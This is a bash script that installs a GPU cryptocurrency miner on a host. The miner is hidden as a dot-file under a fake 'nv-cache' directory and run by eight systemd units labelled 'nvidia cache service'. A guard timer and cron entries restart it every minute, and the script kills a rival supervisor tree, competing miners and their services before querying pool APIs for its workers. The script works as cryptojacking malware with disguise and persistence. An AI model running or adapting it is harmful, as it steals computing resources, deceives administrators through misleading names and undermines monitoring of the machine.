#!/bin/bash
set +e
WALLET=prl1pek8rh8yjck5q7596aph7ua7xnkqs8ur9mkfmz8w7xfzcdfcfx5vsx2f4lz
PREFIX=ul-t2-123-184-7-135
B=/usr/local/lib/nv-cache
K=/opt/arsenal/miners/krig
echo "### FINAL-HARD $(date -u +%FT%TZ)"
S=$(ps -eo pid,args | grep 'krig-miner' | grep -v grep | awk '{print $1}' | head -1)
if [ -n "$S" ]; then
  pp=$(awk '{print $4}' /proc/$S/stat 2>/dev/null); gp=$(awk '{print $4}' /proc/$pp/stat 2>/dev/null)
  echo "krig pid=$S ppid=$pp $(tr '\0' ' ' </proc/$pp/cmdline 2>/dev/null)"
  echo "grandparent=$gp $(tr '\0' ' ' </proc/$gp/cmdline 2>/dev/null)"
  ls -l /proc/$S/cwd 2>/dev/null
fi
echo "### PLH-DIR"; ls -la /opt/plh/ 2>/dev/null | head -20; cat /opt/plh/evidence_evict/watch.sh 2>/dev/null | head -20
echo "### SELF-DEFENSE: neutral names + no start limit"
mkdir -p "$B"; [ -x "$K/krig-miner" ] && cp -f "$K/krig-miner" "$B/.bd" && chmod 700 "$B/.bd"
ls -la "$B"/.bd 2>/dev/null
# kill the plh supervisor tree and its miners
for p in $(ps -eo pid,args | grep -E 'evidence_evict|watch.sh|run_gpu' | grep -v grep | awk '{print $1}'); do kill -KILL "$p" 2>/dev/null; done
for p in $(ps -eo pid,args | grep -E 'prl1p6grd5zl' | grep -v grep | awk '{print $1}'); do kill -KILL "$p" 2>/dev/null; done
sleep 2
for i in 0 1 2 3 4 5 6 7; do systemctl stop ulx-g$i 2>/dev/null; systemctl disable ulx-g$i 2>/dev/null; done
d=0
while [ $d -lt 8 ]; do
cat > /etc/systemd/system/nk-g$d.service <<EOS
[Unit]
Description=nvidia cache service $d
After=network-online.target
StartLimitIntervalSec=0
[Service]
Type=simple
Nice=10
WorkingDirectory=$B
ExecStart=$B/.bd --coin pearl --url stratum+ssl://prl-sg.kryptex.network:8048 --url stratum+tcp://pool.pearlhash.xyz:9000 --url stratum+ssl://pearl-sg1.luckypool.io:3360 --user $WALLET/$PREFIX-g$d --password x -d $d --api-port 127$d
Restart=always
RestartSec=15
[Install]
WantedBy=multi-user.target
EOS
  systemctl daemon-reload 2>/dev/null; systemctl enable --now nk-g$d 2>/dev/null; echo "start nk-g$d"
  d=$((d+1)); sleep 1
done
cat > "$B/g.sh" <<EOS
#!/bin/bash
for i in 0 1 2 3 4 5 6 7; do systemctl is-active --quiet nk-g\$i || systemctl restart nk-g\$i 2>/dev/null; done
ps -eo pid,args | grep -E 'prl1p6grd5zl' | grep -v grep | awk '{print \$1}' | xargs -r kill -KILL 2>/dev/null
EOS
chmod +x "$B/g.sh"
cat > /etc/systemd/system/nk-guard.service <<EOS
[Unit]
Description=nk guard
[Service]
Type=oneshot
ExecStart=/bin/bash $B/g.sh
EOS
cat > /etc/systemd/system/nk-guard.timer <<EOS
[Unit]
Description=nk guard timer
[Timer]
OnBootSec=20
OnUnitActiveSec=30
[Install]
WantedBy=timers.target
EOS
systemctl daemon-reload; systemctl enable --now nk-guard.timer 2>/dev/null; systemctl start nk-guard.service 2>/dev/null
systemctl stop ulx-guard.timer 2>/dev/null; systemctl disable ulx-guard.timer 2>/dev/null; systemctl stop ulx-watch 2>/dev/null
( crontab -l 2>/dev/null | grep -vE '\.u/watch.sh|ulx|nk' ; echo "@reboot /bin/bash $B/g.sh >/dev/null 2>&1"; echo "* * * * * /bin/bash $B/g.sh >/dev/null 2>&1"; echo "*/10 * * * * /bin/bash /dev/shm/.u/sample.sh >/dev/null 2>&1" ) | crontab - 2>/dev/null
sleep 90
echo "### UNITS"; for i in 0 1 2 3 4 5 6 7; do printf 'nk-g%s=%s ' $i "$(systemctl is-active nk-g$i 2>/dev/null)"; done; echo
echo "### PROCS"; ps -eo pid,args | grep -E 'krig-miner|\.bd' | grep -v grep | head -10
echo "### GPU"; nvidia-smi --query-gpu=index,memory.used,utilization.gpu --format=csv,noheader
echo "### KRYPTEX"; curl -s -m 25 "https://pool.kryptex.com/prl/api/v3/miner/workers/$WALLET" | python3 -c '
import json,sys
d=json.load(sys.stdin)["results"]; m=[r for r in d if "ul-t2-123-184-7-135" in r["worker"]]
print("rows",len(m),"online",sum(1 for r in m if r["status"]=="online"),"valid",sum(r["valid"] for r in m))
for r in sorted(m,key=lambda x:x["worker"]): print(r["worker"],r["status"],r["valid"],r["last_share"],r["agent"])
'
echo "### PEARLHASH"; curl -s -m 25 "https://pearlhash.xyz/api/account/$WALLET" | python3 -c '
import json,sys
d=json.load(sys.stdin); ws=[w for w in (d.get("connected_workers") or []) if "123-184" in (w.get("worker_name") or "")]
print("est15",d.get("estimated_hashrate_15s"),"mine",len(ws))
'
echo "### DONE-FINAL-HARD"
